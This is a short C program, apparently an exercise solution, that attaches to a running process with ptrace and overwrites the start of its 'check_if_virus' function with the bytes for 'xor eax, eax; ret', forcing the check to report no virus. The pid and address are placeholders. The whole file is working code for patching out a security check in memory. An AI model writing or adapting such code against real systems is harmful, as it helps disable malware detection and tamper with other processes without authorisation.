#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int pid = 0x12345678;
int CHECK_IF_VIRUS_ADDR = 0x12345678;

int main() {
    
    unsigned char *data = "\x31\xc0\xc3"; //xor eax, eax; ret

    if (ptrace(PTRACE_ATTACH , pid, NULL, NULL) == -1){
        perror("attach");
        return -1;
    }
    int status;
    waitpid(pid, &status, 0); //Wait for the process to stop
    if (WIFEXITED(status)) {  //If the process exited return
        return -1;
    }

    uint32_t *s = (uint32_t *) data;
    
    ptrace(PTRACE_POKETEXT, pid, CHECK_IF_VIRUS_ADDR, *s); //Write the "shellcode" into check_if_virus start    
    
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1){
        perror("detach");
        return -1;
    }

    return 0;
}
